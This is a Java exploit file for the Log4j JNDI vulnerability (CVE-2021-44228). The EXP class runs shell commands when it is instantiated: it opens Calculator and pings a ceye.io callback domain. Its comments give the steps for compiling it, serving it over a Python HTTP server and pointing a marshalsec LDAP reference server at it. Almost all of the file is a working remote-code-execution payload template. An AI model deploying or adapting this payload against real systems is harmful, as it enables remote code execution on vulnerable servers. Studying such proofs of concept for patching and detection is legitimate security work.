package com.r17a.log4j2.cve_2021_44228;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

// TODO
//  1、javac EXP.java（记得先把`package com.r17a.log4j2;`删除）
//  2、在上述文件目录下开启python3 -m http.server
//  3、利用marshalsec工具开启ldap或rmi服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#test 1389
//  也可直接用JNDI_EXPLOIT工具ß
public class EXP implements ObjectFactory {

    public EXP() throws IOException {
        Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
        Runtime.getRuntime().exec("ping *.ceye.io");
    }

    // 实现ObjectFactory防止cast异常，return一个integer即可
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return new Integer(1);
    }
}


